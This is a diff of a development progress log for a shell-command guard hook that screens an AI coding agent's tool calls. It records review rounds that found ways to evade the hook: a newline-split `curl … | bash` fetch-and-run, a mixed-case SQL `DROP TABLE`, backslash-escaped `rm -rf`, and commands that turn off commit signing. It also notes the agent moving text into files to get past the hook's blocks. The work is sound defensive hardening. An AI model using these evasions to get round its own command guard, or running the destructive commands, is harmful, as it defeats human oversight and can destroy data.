@@ -4,7 +4,7 @@ review-cycle: 30d
 retention: archive-after-6m
 staleness-threshold: 90d
 tags: [work/completed, work/in-progress, work/backlog]
-last-reviewed: 2026-08-21
+last-reviewed: 2026-08-23
 compaction_generation: 0
 source_type: canonical
 confidence: high
@@ -282,12 +282,280 @@ implementation, uncommitted as of this entry; committed 2026-08-21 as `4bc107c`.
   its 60 KB byte cap — so `[NS-28]`'s retire-the-line-cap idea needs its own pass; it would remove the
   sole active constraint, not a redundant one.
 
+## 2026-08-25 — Round 9 Completed (all six domains); Separator Hole Closed; Figures Corrected Outward
+
+**The session crossed local midnight — `[NS-34]` exactly as documented.** The contract expired
+2026-08-25T00:00:53Z and was re-proposed with byte-identical scope after verifying the tree was
+untouched overnight. This is a NEW dated section on purpose: appending 08-25 work under the 08-24
+heading is the `493dfa5` error class, and round 9's own Maintainability pass caught the first attempt
+at it.
+
+- ✅ **All six domains ran, plus Opposition** — the first complete review on this branch in nine
+  rounds. Maintainability: 0 blocking, 15 documentation findings. Architecture Drift: 1 blocking.
+  Performance: 0 blocking. (Security/Correctness/Testing ran 2026-08-24; see the section below.)
+- 🔴 **Architecture's blocker was a false completeness claim in `activeContext.md`** — "All nine
+  locations now read 600", refuted by running `mb doctor` once: `mb.sh:831` and `mb.ps1:1090` still
+  enforce 400, so the tool WARNs that `progress.md` exceeds a limit the shipped docs certify as fine.
+  **Second consecutive round that same sentence was found wrong**, and it violates the Failure
+  Criterion this branch itself added. Corrected to state the runtime/doc split honestly; the caps
+  themselves are out of contract scope and stay tracked, not silently reconciled.
+- ✅ **Separator hole CLOSED on user direction** (was recorded as an accepted limit the day before).
+  `git -c core.pager='less | head' config --global commit.gpgsign false` was silently allowed;
+  `core.pager` with a pipe is ordinary configuration and the command unsigns every repo. Nested gaps
+  are now `.{0,300}` — still bounded (they are the quadratic pair) and measured slightly FASTER than
+  the class they replaced. The resulting false positive is ASSERTED in both suites rather than
+  tolerated. **Judgment recorded: the original "document it" call treated the two commands as equally
+  plausible; they are not, and fail-closed was the right direction.**
+- 📌 **The recurring failure mutated: corrections stopped propagating OUTWARD.** Every measured figure
+  inside the script now reproduces (verified independently: 17.86s / 9.38s / 0.465s / ~1.0s flat sh /
+  0.75s bounded / 4.3s unbounded / 46.8s mutant). But the falsified 1.6s figure had migrated into
+  `standards/SECURITY-GUARDRAILS.md` — which ships to adopters via the byte-identical mirror — and
+  the "byte-counting `${#cmd}`" premise this branch spent a round disproving survived verbatim in
+  `CHANGELOG.md`. Corrected: 1.6s→4.3s, 490→296 (`-C` path; 295 was itself off by one — the gap must
+  hold `-C `, the `/` and a trailing space, so path+4≤300), `${#cmd}`→`wc -c`, Pester margin 20x→9x,
+  and a "Verified" UTF-16 claim that a single probe disproved. **The sweep was script-scoped when it
+  needed to be doc-scoped.**
+- 📌 **A performance claim of mine was wrong and is corrected here.** I reported "+82% on every Bash
+  tool call". Measured properly, the `.ps1` path — which runs first wherever pwsh exists — shows
+  **zero** regression (423.8ms → 423.3ms). The +92% lands only on the `.sh` fallback (562→1081ms),
+  i.e. CI and non-pwsh hosts, and is fully accounted for by subprocess count (5→19 spawns at ~34ms
+  each on Windows). On Linux the same spawn delta is likely tens of ms. I had measured one path and
+  generalised.
+- 📌 **Two available wins measured but NOT applied**, per the round's rule that only a live bypass
+  earns code: .NET `NonBacktracking` collapses the 17.86s worst case to **2ms** with byte-identical
+  results on all six patterns (and would make both shells DFA-based, obsoleting the `{0,300}` bounds);
+  and merging the four `confirm_regex` greps plus a git-token pre-gate takes the sh path 1081→~770ms,
+  suite-verified identical. Both deserve their own change, not a tenth round on this one.
+- 🔴 **Two PRE-EXISTING BLOCK-tier evasions filed as separate tasks, deliberately not absorbed:** sh
+  matches case-SENSITIVELY while ps1 is OrdinalIgnoreCase (`psql -c 'Drop Table users'` gets no
+  verdict on sh, and SQL keywords are case-insensitive so it really drops the table); and a trailing
+  `|` is a real line continuation, so `curl http://x |⏎bash` evades BLOCK entirely. Both are on `main`
+  today and are more severe than anything this branch introduced. **Absorbing findings like these is
+  what kept this branch from converging for nine rounds.**
+- **Verified at completion:** full bash suite 448/19 suites/0 failures · `dangerous-commands` 124/0 in
+  C, C.UTF-8 and en_US.UTF-8 · Pester 58/0 · PSScriptAnalyzer 0/23 · 7 mirror pairs identical ·
+  HOOKS-GUIDE trim 321/289 · scope 32/32.
+
+## 2026-08-24 (rounds 8-9) — Round 8's Fixes Rejected by Round 8; Round 9 Then Found the Gap Class Was Itself a Bypass
+
+**Round 8 was STOPPED after 3 of 6 domains on user direction — Security, Correctness and Testing ran; Maintainability, Architecture Drift, Performance and Opposition did NOT. An incomplete review, not a clean Request Changes; no marker written.** Those three still returned four blocking findings, two of them defects in the round-8 fixes themselves. All now fixed.
+
+- ✅ **F1 (cp1252 extraction).** The fix `handoff.md` carried as "designed and proven" was proven against ONE payload shape and would have shipped a live bypass: stdin/stdout are cp1252 with `errors='surrogateescape'`, so escaped payloads break a text-mode WRITE and raw UTF-8 breaks a text-mode READ; the shipped code survived raw payloads only *by accident* (mojibake round-tripping through one codec). Round 8's own binary fix was then incomplete too — strict codecs made lone surrogates and non-UTF-8 bytes RAISE, dropping to raw-stdin matching, which BLOCKed on a trigger phrase in `description`. Final form: bytes first, `surrogateescape` decode fallback, `surrogatepass` write. **8/8 payload classes; the single-codec forms scored 6/8 and 7/8.**
+- ✅ **F2 (`confirm_boundary()`)** — all five sh matchers use `cmd_loose`; reverting turns exactly the 3 escape/quote cases red.
+- 🔴 **F3, and round 8's fix for it BROKE A LIVE GATE.** Round 7's 16.2s used a payload that was not
+  the worst case; the driver is `config`-token density and growth was **CUBIC**, so 50,000 chars was
+  ~47 MINUTES per pattern — a hang, reachable by a heredoc writing prose about `git config`. Round 8
+  bounded **all six** gaps to `{0,200}`; Security and Correctness independently found that in
+  `git (<gap>)--no-gpg-sign` the gap holds the COMMIT MESSAGE, so any message over ~185 chars
+  silently defeated the CONFIRM on both shells. **The generalisation was the error** — "real gaps are
+  tiny" is true of the `config` gaps and false of the message gap. Corrected by measuring per pattern:
+  only the nested pair blows up, so only those four are bounded.
+- 🔴 **My bash timing assertion was a TAUTOLOGY** — `assert_contains "fast" "fast"`. Reverting all six bounds left the suite green at 108/0. GNU grep is a DFA and never gets slow; I had *said* so aloud, wrote the assertion anyway, and counted it in "every new assertion was confirmed to discriminate". I proved the REGEX discriminates, never the ASSERTION. **This violated the Evidence Integrity rule in the same diff that introduces it.** Replaced with a structural invariant. The Pester timing test dropped 50,000 → 8,000 chars: at 50,000 a regression takes ~3 HOURS, i.e. hangs CI rather than failing it.
+- 🔴 **F4's premise was wrong too: `${#cmd}` counts CHARACTERS PER LOCALE, not bytes.** So moving ps1
+  to `UTF8.GetByteCount` INVERTED the divergence rather than closing it, and the assertion failed
+  under `C.UTF-8`/`en_US.UTF-8` — CI's locales. sh now uses `wc -c`; asserted across three locales.
+- ✅ **F5 (non-discriminating tab test) fixed by deleting redundant CODE, not rewriting the test.**
+  Neutering the sole fold site turns 2 assertions red. A sweep also found 2 pre-existing parity
+  assertions and 2 new sanity checks that still cannot fail — open, not fixed.
+- ✅ **Coverage after round 8:** sh 99 → 117, Pester 49 → 55, every new assertion mutation-proved.
+  **The canary earned its place** — the harness first reported four false "non-discriminating"
+  verdicts because `bash` resolved to a WSL stub; only the canary failing too revealed the fault.
+- 📌 **The lesson: a claim in a comment stronger than the code delivers.** "Measured 2/2 correct",
+  "zero semantic change", "agree by construction", "confirmed to discriminate" — each falsified by a
+  single probe a reader could have run.
+
+### Round 9, first three domains (2026-08-24) — completed 2026-08-25, see the section above
+
+Security, Correctness and a Testing-equivalent pass ran this day under the new remediation rule
+(**only a demonstrated live bypass earns code; everything else becomes a documented limit**). The
+remaining three domains plus Opposition ran 2026-08-25 and the outcome is recorded there; only what
+these three found is kept here.
+
+- 🔴 **The gap character class was ITSELF a live bypass** — the sharpest finding of any round, reached
+  independently by two domains. Gaps were `[^|;&]*`, so any `|`, `;` or `&` between `git` and the flag
+  made a pattern unmatchable — and in the `-c` and `--no-gpg-sign` patterns that gap holds the COMMIT
+  MESSAGE. Verified allowed with no prompt on both shells: `git commit -m "docs: R&D notes"
+  --no-gpg-sign`. An ampersand in English prose is not evasion. **And the class never did its job**:
+  newline was never excluded, so the gap already spanned commands.
+- ✅ Fixed to `.*` on those two patterns. `[^newline]` is not portable — a literal newline inside a
+  grep pattern SPLITS it into two patterns, measured — so `.*` plus .NET `Singleline` is what makes
+  the engines agree. That flag is the **third** instance of this file's line-vs-string mismatch
+  (`sed` vs `-replace`, `grep` vs `-imatch`, now `.` vs `.`), fixed in the same change that would
+  have exposed it — which is what `confirm_regex()`'s comment asked for.
+- 🔴 **Two PRE-EXISTING BLOCK-tier evasions found and filed as separate tasks** (sh case-sensitivity;
+  pipe-newline continuation). Detail in the 2026-08-25 section.
+
+## 2026-08-24 (continued) — Review Round 7 — condensed; all five findings superseded by rounds 8-9
+
+Round 7 returned Request Changes with five blocking findings. **All are recorded in full at their
+point of resolution in the rounds 8-9 entry above, which also corrects two of round 7's own claims** —
+so this section is condensed to the durable facts rather than repeated.
+
+- 🔴 **CRITICAL, PRE-EXISTING: the sh hook's python3 extraction ran text-mode I/O under Windows
+  `cp1252`, so any non-ASCII command silently degraded to raw-stdin matching** — the exact
+  false-positive mode the extraction exists to prevent. A CJK payload made sh DENY with "command is
+  120057 characters" (the byte length of the whole JSON file) while the ps1 twin allowed it: opposite
+  verdicts on ordinary input. NOT introduced by this branch. Round 8 found the proposed fix was
+  proven against only one payload shape; see above.
+- 🔴 The de-escaped-view retrofit reached four of five matcher functions — `confirm_boundary()` had
+  zero `cmd_loose` references, so `git m\erge main` was SILENT in sh and CONFIRM in ps1.
+  **Why the mutation proof missed it:** removing `cmd_loose` turned the S1 test red, proving the
+  mechanism works WHERE WIRED, which says nothing about whether every matcher is wired.
+  **Coverage failures wear correctness clothing** — the cheap guard is a COMPLETENESS invariant,
+  a different tool from a discrimination check.
+- 🔴 The de-escaped view doubled the worst-case stall and the accompanying comment understated it;
+  the length-bound units diverged (bash bytes vs .NET UTF-16). Both re-measured and corrected in
+  rounds 8-9 — round 7's own figures turned out to be measured on the wrong payload shape.
+- 🔴 **A whitespace-collapse made a PRE-EXISTING tab test non-discriminating**: neutering the original
+  `tr`/`.Replace` left the payload byte-identically CONFIRMed, so the NBSP platform-parity regression
+  guard was silently gone. No live bypass, but this is the Failure Criterion added to
+  `standards/CODE-REVIEW.md` in the same diff. Fixed in round 8 by deleting the redundant path.
+- ✅ Testing independently re-ran the mutation proof and confirmed it, and verified
+  `PMB_REQUIRE_PARITY=1` hard-fails when pwsh is absent. **Stated caveat: no exhaustive assertion
+  sweep** — round 8's sweep then found further non-discriminating assertions.
+- 📌 **Third instance of coverage-not-correctness, and a new sub-shape:** adding a redundant
+  normalization path silently DISARMS an existing guard without failing it. Mutation testing catches
+  a test that never guarded anything; it does not catch a test whose guard migrated elsewhere.
+
+## 2026-08-24 — Review Round 6: One Blocker, Two Pre-Existing Bypasses Closed, Cap Metric Fixed
+
+- 📌 **Verdict: Request Changes — but a different shape of failure from rounds 1-5.** Six domain
+  agents plus Opposition (Opus). Eight findings arrived `Blocking: true`; Opposition downgraded
+  seven on counter-evidence and **refuted one outright**. Rounds 1-5 each found a NEW live bypass
+  introduced by the change; round 6 found none. Measured against `HEAD`, the change closes two
+  bypasses `main` still has and introduces zero.
+- 🔴 **C1, the sole surviving blocker — and the second time this exact mismatch shipped in this
+  file.** `confirm_regex`'s `grep` is line-based; the `.ps1` twin's `-imatch` is not. So
+  `git commit -m "<two-line message>" --no-gpg-sign` passed silently in sh and denied in ps1.
+  `CHANGELOG.md:44` records that round 4's argument-stripping was withdrawn *because* `sed` is
+  line-based while .NET `-replace` is not — the replacement reintroduced the identical defect one
+  function over. Fixed with `grep -z`; noted in-code so a third instance is harder to write.
+- ✅ **Two PRE-EXISTING bypasses closed (S1, S3), both outside the four documented KNOWN LIMITS.**
+  A shell strips a backslash before ANY character, so `r\m -r\f` runs as `rm -rf` — that defeated
+  the BLOCK tier outright and pre-dates the signing work. Adjacent quoted segments concatenate, so
+  `git config "commit."'gpgsign' false` evaded CONFIRM. Both closed by matching every tier against
+  a second, deliberately de-escaped view in addition to the faithful one — strictly fail-closed,
+  it can only add matches. Cost documented, not hidden: `echo "rm" "-rf"` now trips BLOCK.
+- 📌 **S4/S5 are NOT fixable and are documented instead.** Command substitution
+  (`commit.gpgsign $(echo false)`) and variable indirection (`K=...; git config "$K" false`) need
+  the shell EVALUATED, not read. Patterns that appeared to cover them would be a false claim of
+  coverage — the failure the KNOWN LIMITS block exists to prevent.
+- 🔴 **The round-5 "doubled backslash fail-closed" test could not fail.** It left `rm -rf` intact
+  on line 2, where newline-insensitive substring matching found it whether the join worked, broke,
+  or was deleted. It was written *while* `verification-before-completion` was being invoked, and it
+  survived a substantial rewrite of the join without going red. Found by review, not by the suite.
+- ✅ **Every replacement mutation-proved.** Removing the join, the de-escaped view, `grep -z`, or
+  the length bound each turns its guarding assertion red. Two traps hit while proving it, both now
+  written into `standards/CODE-REVIEW.md`: a mutation that changes BYTES has not necessarily changed
+  BEHAVIOUR (an inert mutator produced a false "test doesn't guard this"), and redundant match paths
+  mask mutations (the de-escaped view answered while the mutated path was disabled).
+- ✅ **`standards/CODE-REVIEW.md` gains an Evidence Integrity section:** a check that cannot fail
+  does not count, and a self-attested completion counts as UNMET — worse than an admitted gap.
+  Mutation testing was already PMB practice (three uses recorded here) but was undocumented
+  folklore with no tooling; `tests/helpers/` has `assert.sh` and `stub-pwsh.sh` and nothing else.
+  Tooling deliberately NOT built under a Request-Changes cycle — spun off as its own spec task.
+- ✅ **P3/P1: input length bound at 50,000 chars, fail-closed.** Two CONFIRM regexes go quadratic
+  under .NET backtracking (measured: 35 KB→3.9s, 140 KB→53.7s, 350 KB→no finish in 180s; GNU grep
+  stayed flat). It REFUSES rather than truncating — truncation is fail-open, since a dangerous
+  substring straddling the cut would vanish. Applied identically in both shells on purpose.
+- ✅ **The line cap was the wrong metric and is now raised 400 → 600.** At 400 the file was 39,590
+  bytes against a 48,000 WARN — the line cap bound first, which is the dimension `[NS-28]` already
+  identified as wrong. Not theoretical: round 5's findings were written under round 4's heading for
+  lack of room, and a 34-line relocation was absorbed by one subsequent entry. Byte WARN now fires
+  first. Earlier the same session this was declined as the user-as-bypass shape; that objection was
+  to AUTHORIZATION, not the technical case, and the user directed it explicitly.
+- 📌 **Docs corrected:** `HOOKS-GUIDE.md` claimed the `mb validate` shim exits 0 (it exits 2 — the
+  code was fixed in the same change, the doc was not); the KNOWN LIMITS block listed one of three
+  accepted false positives and misstated the `GIT_CONFIG_*` cause (the anchor token is absent
+  entirely, not merely mis-positioned); `activeContext.md` said the relocation ended at 392/400
+  where `progress.md` said 372 — 372 is correct, 392 was the post-entry figure.
+- 📌 **External evaluation — the `Unlazy` skill (gates ledger).** Adopted: the self-attestation rule
+  only. Rejected: task tree, depth number, solo/orchestrated modes, parallel dispatch — PMB's
+  bottleneck is verification integrity, not throughput, and `[NS-24]` Task #33 was deferred
+  precisely to avoid a third overlapping mechanism. Key limitation recorded: a gates file proves a
+  command RAN and matched text, which would NOT have caught the vacuous test above.
+- **State:** 19 suites / 423 assertions / 0 failures; `test-dangerous-commands.sh` 99/0; Pester
+  49/0; PSScriptAnalyzer 0 across 23 files; five mirror pairs byte-identical; `HOOKS-GUIDE` trim
+  intact (318/289). Contract at 26 files. Round 7 not yet run.
+
+## 2026-08-23 — Review Round 4: A Pre-Existing Critical, and a Fix Withdrawn
+
+- 🔴 **Backslash line-continuation defeated the whole hook — present since v1, missed by three rounds.**
+  The shell strips `\`+newline before git sees it, so a wrapped command ran as its one-line form while
+  the hook matched raw two-line text. Verified live: `commit.gpgsign` `true`→`false`, no prompt. Not
+  signing-specific — wrapped `git push --force` evaded BLOCK too. Took 3 attempts: substituting a space
+  shipped 2 more bypasses (mid-token splits), so the join deletes + collapses. Quoted keys also ungated.
+- 📌 **Round-3's argument-stripping was withdrawn** (user call). Making the hook's view differ from what
+  the shell runs cost two defects — `sed` line-based vs .NET not, and unquoted multi-word args
+  half-stripped — to buy 1 of 4 false positives anchoring already fixed; the 4th is a KNOWN LIMIT now.
+- 📌 **`mb validate` exits 2, not 0** — old Check 7 emitted a permanent false `[WARN]`, not a false
+  `[OK]`; wrong in code, here, and `activeContext.md`, now fixed in all three. Seen on ACR (1.1.1);
+  `pre-push-check.*` is TEMPLATE_OWNED, so landing this branch ships the fix. `[NS-25]` hit twelve.
+
+## 2026-08-23 (continued) — Cap Deadlock Cleared by Relocation; Round-6 Pre-Gate Hardening
+
+- ✅ **Four non-chronological sections relocated verbatim** to
+  `docs/archive/progress-reference-sections-2026-08-23.md` (What's In This Fork, Removed vs Enterprise,
+  Earlier Sessions 06-19/24, Satellite Projects — 34 lines). 400/400 → 372/400. No condensation, no
+  dated entry touched; verified zero body-line loss. `## Backlog` retained — still actionable.
+- 📌 **A chronological archive pass was considered and rejected on evidence.** Every large dated section
+  is cited by a live `[NS-N]` (08-12/14 → NS-16/17, 08-17 → NS-14/23, 08-18 → NS-24, 08-19 → NS-25/26,
+  08-20 → NS-24, 08-20/21 → NS-32), so evicting one forces citation rewrites into `activeContext.md`,
+  a second capped file with ~25 lines spare — the pass propagates edits into the file it relieves. The
+  only uncited dated section was 08-22, this branch's own work.
+- 🔴 **The cap distorts the record, not just constrains it.** Round 5's findings were folded under the
+  `Review Round 4` heading because no room existed for a new section, so no separate R5 record exists.
+  Primary evidence for `[NS-35]`: `[NS-28]` already found the line cap measures the wrong dimension and
+  bytes (39,539/60,000) were never binding. Re-baselining was argued and **declined for now** —
+  changing a guardrail while blocked by it is the user-as-bypass shape.
+- 📌 **One-time recovery, not a fix.** Growth-vs-eviction asymmetry untouched; `[NS-35]` decision 3
+  (entry lifecycle, deterministic merge/prune) stays open, deliberately not settled under a deadline.
+  Contract re-proposed and approved at 21 files.
+- ✅ **Round-6 pre-gate hardening — two defects fixed before spending a review round.** A stale comment
+  in all four `dangerous-commands.{sh,ps1}` copies prescribed the *withdrawn* space-substituting join —
+  the round-5 mid-token bypass — contradicting a correct comment ten lines below it, in a TEMPLATE_OWNED
+  file that `mb upgrade` pushes downstream; the ps1 also misquoted the sh awk rule. Six parked join edge
+  cases now tested in both shells, four routed via `assert_parity` (closing "join tested per-shell only").
+  418 assertions / Pester 45 / PSA 0-of-23 / mirrors intact. Doubled-backslash divergence traced and
+  confirmed **fail-closed** — no hidden Critical. Round 6 not yet run.
+
+## 2026-08-22 — Commit-Signing CONFIRM Tier; Two Review-Driven Corrections; Midnight Gate-Expiry Found
+
+- ✅ **Signing bypass is now CONFIRM-tier in both shells** (`[NS-25]`-adjacent, reported from ACR against
+  PMB 1.1.1, re-verified against 1.2.1). `gpgsign` appeared nowhere in `scripts/`, `templates/`, or
+  `.claude/settings.json` while the hook-skip flag was already gated. Three regexes shared
+  byte-identically across `.sh`/`.ps1`, restricted to the subset valid in both GNU ERE and .NET.
+  New `confirm_regex()` on the sh side; the ps1 CONFIRM loop already supported a regex flag.
+- 📌 **The incoming brief's part (a) was declined as already-done** — `dangerous-commands.ps1:146` has
+  carried the same ternary as the BLOCK loop since 1.2.1. Its recommended pattern was also incomplete
+  twice over, found by testing real `git`: the falsey set is `false|0|no|off`, not `false|0`, and keys
+  and values are both case-insensitive, so a case-sensitive match is a one-keystroke bypass.
+- 🔴 **Gate rejection #1 — literals missed the persistent form.** The first implementation covered only
+  `-c key=value`; `git config commit.gpgsign false`, `--global`, `--system` and `--unset` were all
+  ungated. Three domains reproduced it independently. The test suite had a negative control using the
+  space-separated syntax for the truthy value but never the falsey counterpart — the coverage gap had
+  a matching test gap, which is why the TDD pass missed it.
+- 🔴 **Gate rejection #2 (self-caught) — the regex fired on prose.** Matching the key anywhere made
+  `echo`, `grep`, a trailing comment, and a sentence where "no" came from "no longer" all trip a
+  CONFIRM. Each pattern now requires `(^|[^a-z])git ([^|;&]*)` — leading boundary so `legit config`
+  does not match, separator class so the key cannot trail across a pipe. **The leading boundary
+  survives; the separator class did NOT** — it was found to be a live bypass in round 9 and removed
+  from every gap (2026-08-24/25 entries). Retained as the record of what was decided then. Known limit documented in
+  code: a command quoting a git invocation as text still matches.
+- 🔴 **NEW — the PreCompact gate expires silently at local midnight.** `pre-compact-check.sh` Check 2
+  requires a `progress.md` entry dated today. This session crossed midnight, so the identical repo
+  state that passed on 2026-08-21 failed on 2026-08-22, with `handoff.md` deleted and therefore no
+  bypass — the compaction safety net was off and nothing announced it. Same shape as `493dfa5`'s
+  session-crossed-midnight dating error, recurring in gating rather than dating. Tracked as `[NS-34]`.
+- 📌 **`[NS-25]` escalation:** eleven documented instances, seven during this task alone — a read-only
+  `grep`, the task contract *documenting the fix*, a heredoc writing test fixtures, and the hook's own
+  test-harness pipe idiom (`printf | bash scripts/dangerous-commands.sh` trips the `|bash` BLOCK rule).
+  Every workaround was identical: move the text into a file, pass a path.
+
 ## 2026-08-12 — Fleet Version Drift Incident (reported, not yet fixed)
 
-- 📌 `ai-code-review-agent` drifted 2 versions behind PMB, ran a 13-task feature under stale
-  governance hooks before caught; not yet fixed (blocked on that session's own cross-repo write
-  boundary). Full detail: `activeContext.md`'s `[NS-14]`, which carries the current-state summary —
-  not duplicated here.
+- 📌 ACR drifted 2 versions behind PMB and ran a 13-task feature under stale governance hooks before
+  it was caught; still unfixed. Current state: `activeContext.md`'s `[NS-14]`.
 
 ## Earlier Work (2026-07-02 through 2026-08-10) — condensed, full detail archived
 
@@ -317,41 +585,13 @@ implementation, uncommitted as of this entry; committed 2026-08-21 as `4bc107c`.
   designed and committed but not yet implemented (`[NS-13]`). Full detail:
   `docs/archive/progress-2026-08-freshness-and-session-claims.md`.
 
-## What's In This Fork
-
-Status: Ready. Personal fork of the enterprise Memory Bank standard — lifecycle management and provenance tracking implemented.
-
-- ✅ Memory Bank system (5-file + handoff protocol) + authority hierarchy + 3-dimension frontmatter
-- ✅ Provenance frontmatter: compaction_generation, source_type, confidence, lineage
-- ✅ Security Guardrails (BLOCK/CONFIRM/WARN) + 9-rule registry (SECURITY-RULES.md) + 9 security fixtures
-- ✅ Code Quality, Logging, 7-phase Workflow standards; Supply Chain, MCP Security, Rules-File Integrity (reference)
-- ✅ Slash commands: /pmb-status, /code-review, /feature-dev, /security-review, /test-audit, /health-check, /mb-drift, /change-review
-- ✅ mb CLI: init, status, doctor (25 checks), query, clean, commit, upgrade, verify-integrity, plan (status/list/promote/archive) + deprecated aliases
-- ✅ Hook suite: dangerous-commands blocker, contract scope check, delegation depth check, auto-last-reviewed, PreCompact memory gate, review gate
-- ✅ Versioned git hooks via core.hooksPath (.githooks/pre-push + pre-commit), distributed by mb upgrade (TEMPLATE_OWNED)
-- ✅ mb upgrade: TEMPLATE_OWNED/ADVISORY_DIFF/ADVISORY_CREATE distribution model; remote version check
-- ✅ CI: template-integrity job + SAST (Semgrep p/bash); CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=40
-- ✅ install.bat / install.sh, examples/task-tracker-api, VERSION, CHANGELOG.md, docs/COMMANDS-REFERENCE.md
-- ✅ Cursor rules (5 rules + code-review rule)
-
-Full history: CHANGELOG.md
-
-## Removed vs Enterprise
-
-Eric Nolan branding/brand assets; Data Classification, Model Governance, OWASP LLM Top 10 (compliance only);
-Incident Runbook, accessibility review command; enterprise logging (PII redaction, correlation IDs);
-team onboarding scripts and training materials.
-
 ## Backlog
 
 Deferred pending operational evidence: handoff CLI, pinned.md, mb update --from-git, mb privacy.
 
-## Earlier Sessions (2026-06-19 to 2026-06-24) — condensed, full detail in CHANGELOG.md
+## Reference Sections — relocated 2026-08-23
 
-- ✅ **06-19:** Semantic drift checks 21-23 added to `mb doctor`; `/mb-drift` skill created; startup context trimmed to below 25 KB.
-- ✅ **06-22:** `docs/plans/` + `.claude/plans/` workflow scaffolded; `mb plan status|list|promote|archive`; doctor check 24 (plan hygiene); `/change-review` command created (9-job review + ACR bridge).
-- ✅ **06-24 Audit Sprint:** Bug fixes (settings.json JSON, pre-compact false positives, TRUNCATE/DELETE guardrails); 8 new test files (115 assertions); CI hardened to 9 jobs (PSScriptAnalyzer, mb-doctor-self-check); perf fixes (O(n²) pre-cache); ACR P0/P1/P2 (comment markers, SARIF, GitHub annotations, schemaVersion).
-
-## Satellite Projects
-
-- **ai-code-review-agent** — `unyieldingclaw-dev/ai-code-review-agent`. v1.1.0: 15 observe-only agents, profiles, --context memory-bank, SARIF, GitHub annotations, agentPolicy, integration contract. 276 tests passing.
+Project inventory, scope-delta vs enterprise, the 2026-06-19/24 session summary, and satellite-project
+pointers moved **verbatim** to `docs/archive/progress-reference-sections-2026-08-23.md` to recover line
+headroom under the 400-line CI cap. Nothing was condensed or rewritten. `## Backlog` stays above because
+it is still actionable. One-time recovery, not a fix — see `[NS-35]` decision 3.
